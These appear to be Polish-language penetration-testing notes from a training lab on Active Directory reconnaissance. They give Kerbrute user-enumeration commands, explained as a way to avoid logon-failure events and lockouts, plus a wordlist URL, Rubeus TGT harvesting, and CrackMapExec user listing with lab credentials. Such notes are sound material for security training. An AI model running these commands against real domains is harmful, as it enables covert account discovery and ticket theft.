# 1) Kerbrute (brute force to jedna ramka UDP to KDC nie generuje eventu zlego logowania)
### Info
To narzędzie wykorzystuje wstępne uwierzytelnianie Kerberos, które jest znacznie szybszym i potencjalnie bardziej niewidocznym sposobem przeprowadzania rozpylania haseł. Ta metoda nie generuje zdarzenia systemu Windows o identyfikatorze 4625: nie udało się zalogować do konta lub błąd logowania, który jest często monitorowany. Narzędzie wysyła żądania biletu TGT do kontrolera domeny bez wstępnego uwierzytelniania Kerberos w celu wyliczenia nazwy użytkownika. Jeśli KDC odpowie błędem PRINCIPAL UNKNOWN, nazwa użytkownika jest nieprawidłowa. Za każdym razem, gdy KDC monituje o wstępne uwierzytelnienie Kerberos, oznacza to, że nazwa użytkownika istnieje, a narzędzie oznaczy ją jako prawidłową. Ta metoda wyliczania nazwy użytkownika nie powoduje błędów logowania i nie blokuje kont. 

### Instalacja
      ▪ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
      ▪ chmod +x kerbrute_linux_amd64
### Enumeracja uzytkownikow (wyslanie jednej ramki UDP do KDC)
      ▪ Nie powoduje to alarmow ani zadnych czerwonych logow
      ▪ ./kerbrute_linux_amd64 userenum --dc <domena> -d <adres domeny> <lista>
      ▪ ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

```console
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

# 2) Przydatne slowniki
      • Slownik
            ▪ https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt

# 3) Proste zabiegi
      • Rubeus (zbiera TGT wysylane do KDC co 30 sekund)
            ▪ .\Rubeus.exe harvest /interval:30 


# Wylistowanie userow jak mamy poprawne poswiadczenia
```console
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
      
      
      
      
      
      
      
      
      
      
      
